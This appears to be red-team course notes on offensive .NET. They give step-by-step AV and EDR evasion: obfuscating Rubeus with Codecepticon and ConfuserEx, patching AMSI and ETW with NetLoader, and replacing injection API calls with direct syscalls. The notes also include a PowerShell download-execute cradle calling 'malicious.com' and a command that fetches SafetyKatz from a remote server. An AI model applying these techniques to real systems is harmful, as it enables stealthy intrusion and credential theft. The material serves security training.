 # Offensive .NET

## Topics Overview

- Offensive .NET Introduction
	- Challenges of Using .NET in Attacks
- Offensive .NET AV Bypass
	- Source Code Obfuscation (with Codecepticon)
	- Binary Obfuscation (with ConfuserEx)
- Offensive .NET Payload Delivery
	- Payload Delivery and Execution (with NetLoader)
	- Enhance NetLoader (with CsWhispers)

---

## Offensive .NET Introduction

**Why use .NET for offensive operations?**

.NET provides a powerful environment for **developing and executing payloads** while avoiding some of the built-in security measures that PowerShell has. Since **System.Management.Automation.dll** (which provides PowerShell's core functionality) includes security features like logging and AMSI, attackers have increasingly turned to **.NET** to bypass these restrictions.

**Key Advantages for Red Teaming**

- **.NET lacks some of the security controls present in PowerShell.**
- **Many open-source Offensive .NET tools exist** that fit different attack methodologies.
- **.NET allows payload execution without triggering PowerShell-specific defenses** like script block logging.

### Challenges of Using .NET in Attacks

While .NET is a useful alternative to PowerShell, it comes with its own challenges:

1️. **Detection by security tools (AV, EDR, etc.)**

- Antivirus (AV) and Endpoint Detection and Response (EDR) solutions analyze .NET binaries and flag known malicious patterns.

2️. **Payload Delivery**

- Unlike PowerShell, which can easily download and execute payloads in memory, .NET payloads often require a different delivery mechanism.
- PowerShell **download-execute cradles** (e.g., `IEX (New-Object Net.WebClient).DownloadString("http://malicious.com/payload")`) make execution easier, but .NET requires different methods.

3️. **Detection by Logging Mechanisms**

- **Process creation logging:** When a .NET binary is executed, Windows logs the creation of the process.
- **Command-line logging:** If arguments are passed to a .NET binary, security tools may analyze and log them.

---

## Offensive .NET AV Bypass

**How to Bypass Windows Defender Signature Detection**

Windows Defender detects .NET payloads based on known signatures (predefined byte patterns in the binary). To bypass this, Red Teamers use:

- **Obfuscation**: Altering the structure of the binary to evade signature-based detection.
- **String Manipulation**: Changing identifiable strings within the code to prevent static detection.
- [**DefenderCheck**](https://github.com/t3hbb/DefenderCheck): Used to analyze which parts of the binary trigger AV detection.
- **Minimal modifications to source code**: Making slight modifications to evade known patterns.

To further evade detection, **source code obfuscation** can be applied to .NET projects before compilation.

### Source Code Obfuscation (with Codecepticon)

[**Codecepticon**](https://github.com/Accenture/Codecepticon) is a powerful tool for **obfuscating .NET source code** before compilation, making it harder for AV to recognize known signatures.

**Steps to Use Codecepticon**

1️. **Compile the project in Visual Studio**
   - After compilation, navigate to the output directory and open the **CommandLineGenerator.html** file.
   - This file allows you to choose different obfuscation techniques.

2️. **Use Codecepticon via Command Line**
   You can execute obfuscation with the following command:
```
C:\AD\Tools\Codecepticon.exe --action obfuscate --module csharp --verbose --path "C:\AD\Tools\Rubeus-master\Rubeus.sln" --map-file "C:\AD\Tools\Rubeus-master\Mapping.html" --profile rubeus --rename ncefpavs --rename-method markov --markov-min-length 3 --markov-max-length 10 --markov-min-words 3 --markov-max-words 5 --string-rewrite --string-rewrite-method xor
```
- `--action obfuscate`: specifies that we are performing obfuscation.
- `--module csharp`: indicates that we are working with C# code.
- `--path "C:\AD\Tools\Rubeus-master\Rubeus.sln"`: path to the **Visual Studio solution** to obfuscate.
- `--map-file "C:\AD\Tools\Rubeus-master\Mapping.html"`: mapping file for renaming.
- `--rename ncefpavs --rename-method markov`: uses a **Markov model** to rename variables and methods.
- `--string-rewrite --string-rewrite-method xor`: obfuscates strings using **XOR encryption**.

3️. **Verify the Effectiveness**
After obfuscation, test the code with **DefenderCheck** to ensure it is not detected by Windows Defender.

### Binary Obfuscation (with ConfuserEx)

After compiling a **.NET binary**, we can obfuscate the executable using [**ConfuserEx**](https://mkaring.github.io/ConfuserEx/) to bypass signature-based detection.

**Steps to Use ConfuserEx**

1️. **Download and Open ConfuserEx**

2️. **Add a New Rule for Maximum Protection**
- In the **Settings page**, add a new **obfuscation rule**.
- **Double-click the rule** and set the preset to **"Maximum"** for the highest level of obfuscation.

3️. **Obfuscate the Binary**
In the **Protect page**, click **"Protect"** to generate the obfuscated binary.

4️. **Verify with DefenderCheck**
After obfuscation, test the executable with **DefenderCheck** to ensure it is not flagged.

### Offensive .NET AV Bypass Summary

✔ **Codecepticon** is used to obfuscate **source code** before compilation.
✔ **ConfuserEx** is a free tool for obfuscating **compiled binaries**, making them harder to detect.
✔ **DefenderCheck** helps verify whether obfuscation is sufficient to evade detection.
✔ **Advanced obfuscation techniques (Markov model, XOR string rewriting, renaming)** help conceal payloads.

---

## Offensive .NET Payload Delivery

### Payload Delivery and Execution (with NetLoader)

NetLoader is a tool used to **load and execute binary payloads**, either from a **local file** or a **remote URL**, while simultaneously disabling Windows security mechanisms.

**AMSI and ETW bypasses are applied before execution** to avoid detection.

**Key Features of NetLoader**

- **Loads binaries from a file or URL**: executes a payload without writing it to disk.
- **Patches AMSI and ETW**: disables **AntiMalware Scan Interface (AMSI)** and **Event Tracing for Windows (ETW)** to prevent detection.
- **Uses classic Process Injection APIs**: can be detected by static analysis tools through **import table analysis**.

**Basic Usage Example**

To load and execute **SafetyKatz.exe** from a remote URL:
```
C:\Users\Public\Loader.exe -path http://172.16.100.X/SafetyKatz.exe
```

`Loader.exe` downloads and executes **SafetyKatz.exe** from the remote server `172.16.100.X`.

### Enhance NetLoader (with CsWhispers)

NetLoader uses **classic Windows API calls** for process injection (e.g., `VirtualAllocEx`, `CreateRemoteThread`), which can be detected by EDRs and AVs via **import table analysis**.

To avoid detection, we integrate NetLoader with [**CsWhispers**](https://github.com/mdsecactivebreach/CsWhispers), which replaces **WinAPI calls with direct syscalls (D/Invoke and Indirect Syscall Execution)**.

**How to Use NetLoader with CsWhispers**

1. **Download and Configure CsWhispers**
- Download and open it in **Visual Studio**.
- Under the **Build Configuration**, enable **"Allow unsafe code"** to support low-level memory operations.

1. **Define NT API Equivalents**
- Create a new file **`CsWhispers.txt`** inside **CsWhispers.Sample**.
- Append the **NT API equivalents and struct definitions** needed to replace Windows API calls in NetLoader.

2. **Modify NetLoader to Use CsWhispers**
- Add the **NetLoader** project into **CsWhispers.Sample**.
- Replace the **classic WinAPI calls** with their **NT equivalents**.
- Compile the project.

3. **Obfuscate the Assembly**
- After building the modified NetLoader, obfuscate the generated **assembly** using **Nimcrypt2**.
- Nimcrypt2 provides **in-memory obfuscation**, making detection much harder.

### Offensive .NET Payload Delivery Summary

✔ **NetLoader** enables payload execution while bypassing AMSI and ETW.
✔ **Classic Windows APIs are flagged by AVs and EDRs, requiring stealth techniques.**
✔ **CsWhispers replaces common WinAPI calls with NT syscalls, making detection harder.**
✔ **Final payloads should be obfuscated using Nimcrypt2 to evade behavioral detection.**

This technique enhances **stealthy payload delivery** in Red Team operations while minimizing detection risks. If you need further examples or details, let me know!

---
---
